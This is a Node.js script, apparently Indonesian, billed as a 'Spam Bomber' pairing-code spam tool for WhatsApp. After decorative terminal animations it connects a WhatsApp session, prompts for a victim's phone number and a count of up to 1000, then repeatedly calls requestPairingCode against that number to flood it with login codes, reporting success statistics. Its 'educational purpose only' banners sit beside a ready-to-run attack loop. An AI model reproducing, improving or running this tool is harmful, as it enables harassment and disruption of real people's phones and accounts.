const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const colors = {
    red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', blue: '\x1b[34m',
    magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m', gray: '\x1b[90m',
    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m', blink: '\x1b[5m'
};

const rainbow = ['\x1b[31m', '\x1b[91m', '\x1b[33m', '\x1b[93m', '\x1b[32m', '\x1b[92m', '\x1b[36m', '\x1b[96m', '\x1b[34m', '\x1b[94m', '\x1b[35m', '\x1b[95m'];

class AnimatorGila {
    constructor() { this.intervals = []; this.timeouts = []; }
    
    clearAll() { 
        this.intervals.forEach(clearInterval); 
        this.timeouts.forEach(clearTimeout); 
        this.intervals = []; 
        this.timeouts = []; 
    }
    
    taxiAnimation(speed = 100) {
        return new Promise((resolve) => {
            const width = 60;
            let pos = -20;
            const taxi = [
                '      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄',
                '     █             █',
                '    █  🚖 TAXI-SPAM  █',
                '   █               █',
                '   █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█',
                '     ██         ██',
                '    █  █       █  █',
                '   █    █     █    █',
                '  █      █▄▄▄▄█      █'
            ];
            
            const road = '══════════════════════════════════════════════════════════';
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.yellow + '\n' + road + colors.reset);
                
                for (let i = 0; i < taxi.length; i++) {
                    let line = ' '.repeat(Math.max(0, pos)) + taxi[i];
                    if (pos + taxi[i].length > width) {
                        line = line.substring(0, width);
                    }
                    console.log(colors.yellow + line + colors.reset);
                }
                
                console.log(colors.yellow + road + colors.reset);
                console.log(colors.green + '\n' + ' '.repeat(pos + 5) + '🚀 MENGIRIM SPAM KE TARGET...' + colors.reset);
                
                pos += 2;
                if (pos > width + 20) {
                    clearInterval(interval);
                    console.clear();
                    resolve();
                }
            }, speed);
            this.intervals.push(interval);
        });
    }
    
    policeCar() {
        return new Promise((resolve) => {
            const width = 70;
            let pos = -25;
            const police = [
                '      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄',
                '     █ 🚓 POLICE-SPAM █',
                '    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█',
                '     ██   🔴🔵   ██',
                '    █  █         █  █',
                '   █    █       █    █',
                '  █      █▄▄▄▄▄█      █'
            ];
            
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.red + '\n══════════════════════════════════════════════════════════════' + colors.reset);
                
                for (let i = 0; i < police.length; i++) {
                    let line = ' '.repeat(Math.max(0, pos)) + police[i];
                    console.log(colors.blue + line + colors.reset);
                }
                
                console.log(colors.red + '══════════════════════════════════════════════════════════════' + colors.reset);
                console.log(colors.red + '\n' + ' '.repeat(pos + 5) + '🚨 WARNING: HANYA UNTUK EDUKASI!' + colors.reset);
                
                pos += 3;
                if (pos > width + 25) {
                    clearInterval(interval);
                    console.clear();
                    resolve();
                }
            }, 80);
            this.intervals.push(interval);
        });
    }
    
    bomberAnimation() {
        return new Promise((resolve) => {
            const bomber = [
                '     ✈️',
                '    /|\\',
                '   / | \\',
                '  /__|__\\',
                '  💣💣💣',
                '  \\     /',
                '   \\   /',
                '    \\ /',
                '     V'
            ];
            
            let y = 0;
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.red + '\n' + ' '.repeat(30) + '💥 BOMBER SPAM ACTIVATED 💥' + colors.reset);
                console.log(colors.yellow + '══════════════════════════════════════════════════════' + colors.reset);
                
                for (let i = 0; i < bomber.length; i++) {
                    console.log(' '.repeat(40) + bomber[i]);
                }
                
                console.log(colors.yellow + '══════════════════════════════════════════════════════' + colors.reset);
                
                const bombs = '💣'.repeat(Math.floor(y / 2));
                console.log(colors.red + '\n' + ' '.repeat(20) + bombs + colors.reset);
                console.log(colors.green + ' '.repeat(25) + '🚀 MENUJU TARGET...' + colors.reset);
                
                y++;
                if (y > 20) {
                    clearInterval(interval);
                    console.clear();
                    for (let i = 0; i < 5; i++) {
                        console.clear();
                        console.log(colors.red + '\n' + '💥'.repeat(30));
                        console.log(' '.repeat(15) + '💣 BOOM! SPAM TERKIRIM! 💣');
                        console.log('💥'.repeat(30) + colors.reset);
                        setTimeout(() => {}, 200);
                    }
                    console.clear();
                    resolve();
                }
            }, 150);
            this.intervals.push(interval);
        });
    }
    
    sateliteAnimation() {
        return new Promise((resolve) => {
            const sat = [
                '    🔭',
                '   /|\\',
                '  / | \\',
                ' /__|__\\',
                '   / \\',
                '  /   \\',
                ' 📡   📡'
            ];
            
            let angle = 0;
            const interval = setInterval(() => {
                console.clear();
                console.log(colors.cyan + '\n' + ' '.repeat(25) + '🛰️  SATELITE SPAM SCAN 🛰️' + colors.reset);
                console.log(colors.blue + '~'.repeat(60) + colors.reset);
                
                const spaces = 30 + Math.sin(angle) * 10;
                for (let i = 0; i < sat.length; i++) {
                    console.log(' '.repeat(spaces) + sat[i]);
                }
                
                console.log(colors.blue + '~'.repeat(60) + colors.reset);
                console.log(colors.green + '\n' + ' '.repeat(20) + '📡 MENCARI TARGET...'.padEnd(40, '.') + colors.reset);
                console.log(colors.yellow + ' '.repeat(20) + '📶 SINYAL: ' + '█'.repeat(Math.floor(Math.abs(Math.sin(angle) * 10))) + colors.reset);
                
                angle += 0.5;
                if (angle > Math.PI * 4) {
                    clearInterval(interval);
                    console.clear();
                    resolve();
                }
            }, 120);
            this.intervals.push(interval);
        });
    }
    
    sendNotification(title, message, type = 'info') {
        const color = type === 'success' ? colors.green : 
                     type === 'error' ? colors.red : 
                     type === 'warning' ? colors.yellow : colors.cyan;
        
        const icon = type === 'success' ? '✅' : 
                    type === 'error' ? '❌' : 
                    type === 'warning' ? '⚠️' : 'ℹ️';
        
        const notif = [
            '┌' + '─'.repeat(50) + '┐',
            `│ ${icon} ${title.padEnd(47)} │`,
            '├' + '─'.repeat(50) + '┤',
            `│ ${message.padEnd(48)} │`,
            '└' + '─'.repeat(50) + '┘'
        ];
        
        console.log('\n' + color + notif.join('\n') + colors.reset + '\n');
    }
    
    showStats(success, failed, total) {
        const width = 50;
        const successBar = Math.floor((success / total) * width);
        const failedBar = Math.floor((failed / total) * width);
        const remaining = width - successBar - failedBar;
        
        console.log(colors.cyan + '\n' + '📊 ' + 'STATISTIK REAL-TIME '.padEnd(47, '═') + colors.reset);
        console.log(colors.green + `   SUCCESS: ${'█'.repeat(successBar)} ${success}/${total}` + colors.reset);
        console.log(colors.red + `   FAILED:  ${'█'.repeat(failedBar)} ${failed}/${total}` + colors.reset);
        if (remaining > 0) {
            console.log(colors.gray + `   PENDING: ${'░'.repeat(remaining)} ${total - success - failed}/${total}` + colors.reset);
        }
        console.log(colors.yellow + `   PROGRESS: ${Math.round(((success + failed) / total) * 100)}%` + colors.reset);
        console.log(colors.cyan + '══════════════════════════════════════════════════════' + colors.reset);
    }
    
    typewriter(text, delay = 20) {
        return new Promise((resolve) => {
            let i = 0;
            const colors = [colors.cyan, colors.green, colors.yellow, colors.magenta];
            let colorIdx = 0;
            
            const type = () => {
                if (i < text.length) {
                    process.stdout.write(colors[colorIdx % colors.length] + text.charAt(i) + colors.reset);
                    i++;
                    colorIdx++;
                    this.timeouts.push(setTimeout(type, delay));
                } else {
                    process.stdout.write('\n');
                    resolve();
                }
            };
            type();
        });
    }
}

const anim = new AnimatorGila();

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { 
        rl.question(colors.cyan + text + colors.reset, (answer) => { rl.close(); resolve(answer); });
    });
};

async function showWelcome() {
    console.clear();
    
    await anim.taxiAnimation(80);
    await new Promise(r => setTimeout(r, 800));
    
    await anim.policeCar();
    await new Promise(r => setTimeout(r, 800));
    
    await anim.bomberAnimation();
    await new Promise(r => setTimeout(r, 800));
    
    await anim.sateliteAnimation();
    
    console.clear();
    console.log(colors.red + '\n' + '🔥'.repeat(65));
    console.log('🔥'.repeat(65));
    console.log(colors.yellow);
    console.log('   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄');
    console.log('  █                                                       █');
    console.log('  █  ██████╗ ██████╗ ███╗   ███╗██████╗ ███████╗██████╗   █');
    console.log('  █ ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗  █');
    console.log('  █ ██║     ██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝  █');
    console.log('  █ ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗  █');
    console.log('  █ ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║  █');
    console.log('  █  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝  █');
    console.log('  █                                                       █');
    console.log('  █  ███████╗██████╗  █████╗ ███╗   ███╗                 █');
    console.log('  █  ██╔════╝██╔══██╗██╔══██╗████╗ ████║                 █');
    console.log('  █  ███████╗██████╔╝███████║██╔████╔██║                 █');
    console.log('  █  ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║                 █');
    console.log('  █  ███████║██║     ██║  ██║██║ ╚═╝ ██║                 █');
    console.log('  █  ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝                 █');
    console.log('  █                                                       █');
    console.log('   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀');
    console.log(colors.reset);
    console.log(colors.red + '🔥'.repeat(65));
    console.log('🔥'.repeat(65) + colors.reset);
    
    anim.sendNotification('WELCOME TO SPAM BOMBER', 'ULTIMATE PAIRING CODE SPAM TOOL v5.0', 'warning');
    
    await anim.typewriter(colors.green + '\n   👑 CREATED BY: FLOWFALCON' + colors.reset);
    await anim.typewriter(colors.cyan + '   🔥 RENOVASI BY: RIM' + colors.reset);
    await anim.typewriter(colors.yellow + '   ⚠️  WARNING: FOR EDUCATIONAL PURPOSE ONLY!' + colors.reset);
    
    console.log('\n' + colors.magenta + '═'.repeat(65) + colors.reset);
    await anim.typewriter(colors.white + '   🎯 TEKAN ENTER UNTUK MELANJUTKAN KE SPAM MODE...' + colors.reset);
    await question('');
    console.clear();
}

async function KleeProject() {
    await showWelcome();
    
    anim.sendNotification('SYSTEM INITIALIZATION', 'Loading spam modules and connecting to server...', 'info');
    
    try {
        const { state } = await useMultiFileAuthState('./69/session');
        const KleeBotInc = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000,
            emitOwnEvents: true,
            fireInitQueries: true,
            generateHighQualityLinkPreview: true,
            syncFullHistory: true,
            markOnlineOnConnect: true,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
        });
        
        anim.sendNotification('CONNECTION ESTABLISHED', 'Successfully connected to WhatsApp server!', 'success');
        
        console.log(colors.yellow + '\n' + '🚨 '.repeat(16) + colors.reset);
        const target = await question(colors.red + '\n💀 MASUKKAN NOMOR TARGET (62xxxxxxxxxx): ' + colors.reset);
        
        if (!target.startsWith('62')) {
            anim.sendNotification('ERROR', 'Nomor harus diawali dengan 62! Contoh: 6281234567890', 'error');
            return;
        }
        
        const jumlah = parseInt(await question(colors.red + '💣 JUMLAH SPAM (1-1000): ' + colors.reset));
        
        if (isNaN(jumlah) || jumlah <= 0 || jumlah > 1000) {
            anim.sendNotification('ERROR', 'Jumlah harus antara 1-1000!', 'error');
            return;
        }
        
        anim.sendNotification('SPAM CONFIGURATION', `Target: ${target} | Amount: ${jumlah} codes`, 'warning');
        
        console.clear();
        anim.sendNotification('ATTACK STARTED', `🚀 Launching spam attack to ${target}...`, 'info');
        
        let success = 0;
        let failed = 0;
        const kodeSukses = [];
        
        console.log(colors.red + '\n' + '💀 '.repeat(16) + colors.reset);
        console.log(colors.yellow + '\n   🎯 TARGET: ' + colors.red + target + colors.reset);
        console.log(colors.yellow + '   🔢 TOTAL: ' + colors.cyan + jumlah + ' kode pairing' + colors.reset);
        console.log(colors.red + '💀 '.repeat(16) + colors.reset);
        
        const startTime = Date.now();
        
        for (let i = 0; i < jumlah; i++) {
            const attempt = i + 1;
            
            try {
                anim.sendNotification(`ATTEMPT ${attempt}/${jumlah}`, `Sending pairing code to ${target}...`, 'info');
                
                let code = await KleeBotInc.requestPairingCode(target);
                const originalCode = code;
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                
                success++;
                kodeSukses.push({ code: code, original: originalCode });
                
                anim.sendNotification(`SUCCESS ${attempt}`, `Code sent: ${code}`, 'success');
                console.log(colors.green + `   ✅ [${attempt}/${jumlah}] ${code} → TERKIRIM!` + colors.reset);
                
                if (success % 5 === 0) {
                    anim.showStats(success, failed, jumlah);
                }
                
            } catch (error) {
                failed++;
                anim.sendNotification(`FAILED ${attempt}`, `Error: ${error.message}`, 'error');
                console.log(colors.red + `   ❌ [${attempt}/${jumlah}] GAGAL: ${error.message}` + colors.reset);
            }
            
            await new Promise(r => setTimeout(r, 700 + Math.random() * 300));
        }
        
        const endTime = Date.now();
        const duration = ((endTime - startTime) / 1000).toFixed(2);
        
        console.clear();
        
        anim.sendNotification('ATTACK COMPLETED', `Spam finished in ${duration} seconds!`, 'success');
        
        console.log(colors.green + '\n' + '█'.repeat(65));
        console.log('█'.repeat(65) + colors.reset);
        
        anim.sendNotification('FINAL REPORT', `Duration: ${duration}s | Target: ${target}`, 'info');
        
        console.log(colors.cyan + '\n   📊 DETAILED STATISTICS:' + colors.reset);
        console.log(colors.green + `   ├─ ✅ SUCCESS: ${success} codes` + colors.reset);
        console.log(colors.red + `   ├─ ❌ FAILED: ${failed} codes` + colors.reset);
        console.log(colors.yellow + `   ├─ 🎯 TOTAL: ${jumlah} attempts` + colors.reset);
        console.log(colors.magenta + `   ├─ ⚡ DURATION: ${duration} seconds` + colors.reset);
        const rate = ((success / jumlah) * 100).toFixed(2);
        console.log(colors.blue + `   └─ 📈 SUCCESS RATE: ${rate}%` + colors.reset);
        
        if (kodeSukses.length > 0) {
            anim.sendNotification('SUCCESSFUL CODES', `${kodeSukses.length} codes delivered successfully!`, 'success');
            
            console.log(colors.yellow + '\n   📋 LIST OF DELIVERED CODES:' + colors.reset);
            kodeSukses.forEach((item, idx) => {
                const color = rainbow[idx % rainbow.length];
                console.log(color + `   ${(idx + 1).toString().padStart(3, '0')}. ${item.code}` + colors.reset);
            });
        }
        
        console.log(colors.green + '\n' + '█'.repeat(65));
        console.log('█'.repeat(65) + colors.reset);
        
        anim.sendNotification('SYSTEM MESSAGE', 'Spam attack completed successfully!', 'success');
        
        console.log(colors.red + '\n' + '🔥 FINAL NOTIFICATION 🔥' + colors.reset);
        console.log(colors.yellow + '   👑 Original Creator: FlowFalcon' + colors.reset);
        console.log(colors.cyan + '   🔥 Renovation by: Rim' + colors.reset);
        console.log(colors.magenta + '   ⚠️  Educational Purpose Only!' + colors.reset);
        console.log(colors.green + '   ✅ All spam codes have been processed!' + colors.reset);
        
        console.log('\n' + colors.rainbow);
        for (let i = 0; i < 3; i++) {
            console.log('   🚀 '.repeat(8));
            console.log('   💥 '.repeat(8));
            await new Promise(r => setTimeout(r, 300));
        }
        console.log(colors.reset);
        
        anim.sendNotification('THANK YOU', 'Thanks for using Spam Bomber Tool!', 'info');
        
    } catch (error) {
        anim.sendNotification('CRITICAL ERROR', `System failed: ${error.message}`, 'error');
        console.log(colors.red + '\n   💀 SYSTEM CRASHED!' + colors.reset);
        console.log(colors.yellow + `   🔧 Error details: ${error.message}` + colors.reset);
        console.log(colors.cyan + '   💡 Tips: Check internet connection and session folder' + colors.reset);
    }
    
    anim.clearAll();
}

process.on('SIGINT', () => {
    anim.clearAll();
    console.log(colors.red + '\n\n💀 SPAM STOPPED BY USER!' + colors.reset);
    process.exit(0);
});

console.clear();
KleeProject().catch(err => {
    console.error(colors.red + 'FATAL ERROR: ' + err.message + colors.reset);
});
